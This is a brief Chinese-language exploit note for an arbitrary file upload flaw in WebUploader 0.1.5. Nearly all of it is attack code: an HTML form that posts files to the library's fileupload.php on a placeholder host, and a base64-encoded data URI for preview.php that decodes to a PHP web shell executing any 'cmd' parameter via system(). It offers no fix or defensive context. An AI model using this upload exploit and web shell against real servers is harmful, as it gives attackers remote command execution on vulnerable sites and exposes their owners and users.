# webuploader

---

影响版本：0.1.5

本地构造html文件，任意上传

```
<body>
    <form action="http://xxx.com/lib/webuploader/0.1.5/server/fileupload.php" method="post" enctype="multipart/form-data">
    <input type="text" name="name" />
    <input type="file" name="file" />
    <input type="submit" value="上传文件" />
    </form>
</body>
```

任意上传

```
/lib/webuploader/0.1.5/server/preview.php

data:image/php;base64,PD9waHANCiAgICBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7DQogICAgICAgICAgICBlY2hvICI8cHJlPiI7DQogICAgICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOw0KICAgICAgICAgICAgc3lzdGVtKCRjbWQpOw0KICAgICAgICAgICAgZWNobyAiPC9wcmU+IjsNCiAgICAgICAgICAgIGRpZTsNCiAgICB9DQogICAgcGhwaW5mbygpOw0KPz4=

```

